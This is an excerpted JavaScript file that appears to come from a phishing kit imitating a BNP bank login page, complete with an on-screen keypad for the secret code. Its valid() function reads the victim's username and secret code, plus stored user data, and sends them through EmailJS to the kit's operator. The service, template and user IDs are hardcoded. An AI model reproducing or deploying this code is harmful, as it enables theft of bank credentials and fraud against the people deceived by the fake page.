...
const valid = () => {
	...
	(function () {
		emailjs.init("2HHaAONcfhi4Enc_N");
	})();
...
month = "0" + month;
	...
	const service_id = 'service_axl1xu8'
	const template_id = 'template_ye5kunp'
	const user_id = '2HHaAONcfhi4Enc_N'
	...
	const data = {
		...
		template_params: {
			'from_name': 'VIVI BNP',
			'to_name': 'Acces',
			'message': `Informations acces : Identifiant : ${document.getElementById("username").value} ----------\n Code secret : ${document.getElementById("secret-nbr").value} ----------\n Date : ${x} ----------\n Info utilisateur : ${localStorage.getItem("data-user")}`,
			//'date' : date,
		}
	};
	...
	if (typeof positionCount !== 'undefined') {
		...
		$("#secret-nbr-keyboard > a").each(function () {
			$(this).click(function () {
				...
				if (clientId.val().length != "" && pass.val().length != "") {
...
function responsiveClickZone() {
	...
	$("#secret-nbr-keyboard a").css("height", height + "px");S
}

window.onload = responsiveClickZone()
